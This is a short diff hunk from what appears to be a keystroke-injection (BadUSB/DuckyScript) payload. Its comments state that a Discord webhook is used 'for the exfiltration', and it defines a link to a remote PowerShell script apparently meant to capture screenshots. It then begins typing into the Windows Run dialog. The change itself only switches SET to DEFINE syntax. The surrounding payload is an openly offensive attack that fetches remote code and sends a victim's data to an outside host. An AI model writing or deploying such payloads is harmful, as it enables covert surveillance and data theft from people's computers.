@@ -12,8 +12,8 @@ REM Requirements:
 REM     - Internet Connection
 REM     - Discord Webhook (or whatever you want for the exfiltration)
 
-REM REQUIRED - Set your PowerShell script link
-SET SCRIPT_PY_LINK=https://raw.githubusercontent.com/nazarhktwitch/WinProdKey.ps1/main/other/script_screenshot.ps1
+REM REQUIRED - Define the PowerShell script link
+DEFINE SCRIPT_PY_LINK=https://raw.githubusercontent.com/nazarhktwitch/WinProdKey.ps1/main/other/script_screenshot.ps1
 
 DELAY 1000
 GUI r
